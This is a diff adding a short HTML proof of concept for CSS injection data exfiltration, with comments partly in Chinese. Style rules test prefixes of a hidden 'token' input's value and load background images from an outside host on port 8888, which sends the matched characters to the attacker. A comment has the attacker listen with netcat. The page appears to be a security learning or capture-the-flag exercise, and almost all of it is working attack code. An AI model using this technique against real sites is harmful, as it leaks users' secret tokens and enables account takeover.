@@ -1,0 +1,27 @@
+<html>
+
+<!-- 
+	attacker: nc -lv 8888
+    ^= 開頭
+    只會執行最後一個 e.g. 54    
+-->
+
+<head>
+</head>
+
+<body>
+    <form action="/" method="GET">
+        <input type="text" name="token" value="54089588" onkeydown="attack()" />
+    </form>
+	
+	<style>
+    	input[name=token][value^="4"]   { background-image: url("http://vps.kruztw.tw:8888/4"); }
+    	input[name=token][value^="5"]   { background-image: url("http://vps.kruztw.tw:8888/5"); }
+    	input[name=token][value^="6"]   { background-image: url("http://vps.kruztw.tw:8888/6"); }
+    	input[name=token][value^="540"] { background-image: url("http://vps.kruztw.tw:8888/540"); }
+    	input[name=token][value^="54"]  { background-image: url("http://vps.kruztw.tw:8888/54"); }
+	</style>
+
+</body>
+
+</html>
